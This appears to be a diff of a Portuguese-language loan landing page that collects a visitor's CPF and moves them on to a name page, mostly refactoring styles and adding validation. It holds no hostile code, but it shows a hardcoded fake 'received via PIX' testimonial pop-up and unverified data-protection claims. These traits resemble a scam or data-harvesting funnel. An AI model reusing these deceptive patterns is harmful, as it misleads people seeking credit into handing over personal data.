@@ -5,110 +5,110 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Consulta de CPF - Bancred</title>
   <meta name="theme-color" content="#FFFFFF">
-  <meta name="keywords" content="emprestimo, fácil, nome sujo, pix">
-  <meta name="author" content="Bancred">
   <meta name="description" content="Informe seu CPF para iniciar a análise do seu empréstimo Bancred.">
   <meta property="og:title" content="Consulta de CPF - Bancred">
   <meta property="og:description" content="Informe seu CPF para iniciar a análise do seu empréstimo.">
-  <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          fontFamily: { sans: ['Inter', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'sans-serif'] },
-          borderRadius: { xl: '0.75rem', '2xl': '1rem' }
-        }
-      }
-    }
-  </script>
   <style>
-    * { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-font-smoothing: antialiased; }
-    input:focus { outline: none; box-shadow: 0 0 0 2px #3B82F6; }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; border: 0 solid; }
+    html { -webkit-text-size-adjust: 100%; }
+    body {
+      min-height: 100dvh;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      color: #111827;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+      background: #FFFFFF;
+    }
+    h1, h2, h3, h4, p { margin: 0; }
+    input, button { font-family: inherit; }
+    input:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #FFFFFF, 0 0 0 4px #3B82F6;
+    }
+    button:hover { filter: brightness(0.93); }
   </style>
 </head>
 <body>
 
-<div class="min-h-screen flex flex-col bg-white">
-
   <!-- Header -->
-  <header class="bg-white border-b border-gray-200">
-    <div class="container mx-auto px-4 py-4">
-      <div class="flex justify-center">
-        <a href="index.html" style="height:76px;display:inline-flex;align-items:center;justify-content:center;gap:10px;text-decoration:none">
-          <svg width="38" height="38" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect width="38" height="38" rx="10" fill="#EFF6FF"/>
-            <path d="M7 28V16l12-7 12 7v12" stroke="#1C68E3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <rect x="14" y="20" width="10" height="8" rx="1" stroke="#1C68E3" stroke-width="2"/>
-            <path d="M10 28h18" stroke="#1C68E3" stroke-width="2" stroke-linecap="round"/>
-          </svg>
-          <span style="font-size:26px;font-weight:800;color:#1C68E3;letter-spacing:-1px">Bancred</span>
-        </a>
-      </div>
+  <header style="background:#FFFFFF;border-bottom:1px solid #E5E7EB;padding:16px;">
+    <div style="max-width:1280px;margin:0 auto;display:flex;justify-content:center;">
+      <a href="index.html" style="height:76px;display:inline-flex;align-items:center;justify-content:center;gap:10px;text-decoration:none;">
+        <svg width="38" height="38" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect width="38" height="38" rx="10" fill="#EFF6FF"/>
+          <path d="M7 28V16l12-7 12 7v12" stroke="#1C68E3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          <rect x="14" y="20" width="10" height="8" rx="1" stroke="#1C68E3" stroke-width="2"/>
+          <path d="M10 28h18" stroke="#1C68E3" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span style="font-size:26px;font-weight:800;color:#1C68E3;letter-spacing:-1px;">Bancred</span>
+      </a>
     </div>
   </header>
 
   <!-- Main -->
-  <main class="flex-1 bg-gray-50">
-    <section class="py-12 h-full">
-      <div class="container mx-auto px-4">
-        <div class="max-w-md mx-auto">
+  <main style="flex:1;background:#F9FAFB;">
+    <section style="padding:48px 16px;height:100%;">
+      <div style="max-width:448px;margin:0 auto;">
 
-          <div class="rounded-2xl border bg-white border-gray-200 shadow-lg">
+        <!-- Card -->
+        <div style="background:#FFFFFF;border:1px solid #E5E7EB;border-radius:16px;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -2px rgba(0,0,0,0.1);overflow:visible;">
 
-            <!-- Card Header -->
-            <div class="flex flex-col space-y-1.5 p-6 text-center pb-6">
-              <div class="w-16 h-16 bg-blue-50 border-2 border-blue-200 rounded-full flex items-center justify-center mx-auto mb-4">
-                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2563EB" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-                  <path d="m16 11 2 2 4-4"></path>
-                  <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
-                  <circle cx="9" cy="7" r="4"></circle>
-                </svg>
-              </div>
-              <div class="tracking-tight text-2xl font-semibold text-slate-900">Vamos começar sua análise</div>
-              <p class="text-slate-500 mt-2">Informe seu CPF para começar</p>
+          <!-- Card Header -->
+          <div style="padding:24px 24px 0;text-align:center;">
+            <div style="width:64px;height:64px;background:#EFF6FF;border:2px solid #BFDBFE;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px auto;">
+              <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2563EB" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                <path d="m16 11 2 2 4-4"></path>
+                <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                <circle cx="9" cy="7" r="4"></circle>
+              </svg>
             </div>
+            <div style="font-size:22px;font-weight:600;color:#0F172A;letter-spacing:-0.3px;">Vamos começar sua análise</div>
+            <p style="color:#64748B;margin-top:8px;font-size:15px;">Informe seu CPF para começar</p>
+          </div>
 
-            <!-- Card Body -->
-            <div class="p-6 pt-0">
-              <form class="space-y-6" onsubmit="handleSubmit(event)">
-                <div class="space-y-2">
-                  <label class="text-sm font-medium leading-none text-gray-700" for="cpf">CPF</label>
-                  <input
-                    type="text"
-                    id="cpf"
-                    inputmode="numeric"
-                    autocomplete="off"
-                    placeholder="000.000.000-00"
-                    maxlength="14"
-                    oninput="formatCPF(this)"
-                    class="flex w-full rounded-xl border bg-white px-4 text-base font-medium border-gray-300 transition-colors"
-                    style="height:52px;font-size:16px;"
-                    value=""
-                  >
-                </div>
+          <!-- Card Body -->
+          <div style="padding:24px;">
+            <form onsubmit="handleSubmit(event)">
 
-                <button
-                  type="submit"
-                  class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-xl text-base font-semibold w-full bg-blue-600 hover:bg-blue-700 text-white transition-colors"
-                  style="min-height:48px;padding:12px 16px;border:none;cursor:pointer;"
+              <!-- CPF Field -->
+              <div style="margin-bottom:20px;">
+                <label for="cpf" style="display:block;font-size:14px;font-weight:500;color:#374151;margin-bottom:6px;">CPF</label>
+                <input
+                  type="text"
+                  id="cpf"
+                  inputmode="numeric"
+                  autocomplete="off"
+                  placeholder="000.000.000-00"
+                  maxlength="14"
+                  oninput="formatCPF(this)"
+                  style="width:100%;height:52px;padding:0 16px;border:1px solid #D1D5DB;border-radius:12px;background:#FFFFFF;font-size:16px;font-weight:500;color:#111827;transition:border-color 0.2s;"
                 >
-                  Continuar
-                </button>
+                <p id="cpf-error" style="display:none;color:#DC2626;font-size:12px;margin-top:4px;">Digite um CPF válido com 11 dígitos.</p>
+              </div>
 
-                <div class="mt-4 space-y-1">
-                  <div class="flex items-center gap-2">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"></path></svg>
-                    <p class="text-xs text-slate-500">Seus dados estão protegidos e não serão compartilhados</p>
-                  </div>
-                  <div class="flex items-center gap-2">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"></path></svg>
-                    <p class="text-xs text-slate-500">Análise em tempo real sem afetar seu score</p>
-                  </div>
+              <!-- Submit Button -->
+              <button
+                type="submit"
+                style="width:100%;min-height:48px;padding:12px 16px;background:#2563EB;color:#FFFFFF;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s;display:flex;align-items:center;justify-content:center;gap:8px;"
+              >
+                Continuar
+              </button>
+
+              <!-- Trust Items -->
+              <div style="margin-top:16px;display:flex;flex-direction:column;gap:6px;">
+                <div style="display:flex;align-items:center;gap:8px;">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="flex-shrink:0;"><path d="M20 6 9 17l-5-5"></path></svg>
+                  <p style="font-size:12px;color:#64748B;">Seus dados estão protegidos e não serão compartilhados</p>
                 </div>
-              </form>
-            </div>
+                <div style="display:flex;align-items:center;gap:8px;">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" style="flex-shrink:0;"><path d="M20 6 9 17l-5-5"></path></svg>
+                  <p style="font-size:12px;color:#64748B;">Análise em tempo real sem afetar seu score</p>
+                </div>
+              </div>
 
+            </form>
           </div>
         </div>
       </div>
@@ -116,43 +116,35 @@
   </main>
 
   <!-- Footer -->
-  <footer class="bg-gray-900 text-gray-300 py-8 border-t border-gray-800">
-    <div class="container mx-auto px-4">
-      <div class="text-center space-y-3">
-        <div class="text-sm space-y-2">
-          <div class="text-gray-400">© 2026 Bancred LTDA. Todos os direitos reservados.</div>
-          <div class="text-gray-500">CNPJ 41.906.644/0001-20</div>
-          <p class="text-xs text-gray-500 mt-1">Empréstimos rápidos e seguros para realizar seus sonhos</p>
-        </div>
-      </div>
-    </div>
+  <footer style="background:#111827;color:#D1D5DB;text-align:center;padding:32px 16px;font-size:12px;line-height:1.7;font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;border-top:1px solid #1F2937;">
+    <div style="color:#9CA3AF;">© 2026 Bancred LTDA. Todos os direitos reservados.</div>
+    <div style="color:#6B7280;margin-top:4px;">CNPJ 41.906.644/0001-20</div>
+    <p style="font-size:11px;color:#6B7280;margin-top:4px;">Empréstimos rápidos e seguros para realizar seus sonhos</p>
   </footer>
 
   <!-- Floating Notification -->
-  <div id="notification" class="fixed bottom-6 left-6 right-6 sm:right-auto sm:max-w-sm z-50 transition-all duration-500 transform pointer-events-none" style="opacity:0;transform:translateY(100%)">
-    <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-4 max-w-sm">
-      <div class="flex items-start gap-3">
-        <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
+  <div id="notification" style="position:fixed;bottom:24px;left:24px;right:24px;max-width:384px;z-index:50;transition:transform 0.5s ease,opacity 0.5s ease;transform:translateY(100%);opacity:0;pointer-events:none;">
+    <div style="background:rgba(255,255,255,0.97);border-radius:12px;box-shadow:0 10px 25px -5px rgba(0,0,0,0.15);border:1px solid #E5E7EB;padding:16px;">
+      <div style="display:flex;gap:12px;align-items:flex-start;">
+        <div style="width:40px;height:40px;background:#DCFCE7;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
           <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
             <path d="M10.268 21a2 2 0 0 0 3.464 0"></path>
             <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326"></path>
           </svg>
         </div>
-        <div class="flex-1 min-w-0">
-          <div class="flex items-baseline gap-1">
-            <h4 class="font-semibold text-gray-900 text-sm truncate">Cláudia J.</h4>
-            <span class="text-xs text-gray-500">de Goiânia</span>
+        <div style="flex:1;min-width:0;">
+          <div style="display:flex;align-items:baseline;gap:6px;">
+            <span style="font-weight:700;font-size:14px;color:#111827;">Cláudia J.</span>
+            <span style="font-size:12px;color:#6B7280;">de Goiânia</span>
           </div>
-          <p class="text-sm text-gray-600 mb-2">Recebeu via PIX R$&nbsp;17.450,00</p>
-          <div class="w-full bg-gray-200 rounded-full" style="height:6px">
-            <div class="bg-green-500 rounded-full" style="height:6px;width:100%"></div>
+          <p style="font-size:13px;color:#4B5563;margin-top:2px;margin-bottom:8px;">Recebeu via PIX R$&nbsp;17.450,00</p>
+          <div style="background:#E5E7EB;border-radius:999px;height:6px;overflow:hidden;">
+            <div style="background:#16A34A;height:6px;width:100%;border-radius:999px;"></div>
           </div>
         </div>
       </div>
     </div>
   </div>
-
-</div>
 
 <script>
   function formatCPF(input) {
@@ -166,18 +158,22 @@
       v = v.replace(/(\d{3})(\d{0,3})/, '$1.$2');
     }
     input.value = v;
+    document.getElementById('cpf-error').style.display = 'none';
+    input.style.borderColor = '#D1D5DB';
   }
 
   function handleSubmit(e) {
     e.preventDefault();
     var cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-    if (cpf.length === 11) {
-      sessionStorage.setItem('cpf', cpf);
-      window.location.href = 'nome.html';
+    if (cpf.length !== 11) {
+      document.getElementById('cpf-error').style.display = 'block';
+      document.getElementById('cpf').style.borderColor = '#DC2626';
+      return;
     }
+    sessionStorage.setItem('cpf', cpf);
+    window.location.href = 'nome.html';
   }
 
-  // Show notification after 2s
   setTimeout(function() {
     var n = document.getElementById('notification');
     n.style.opacity = '1';
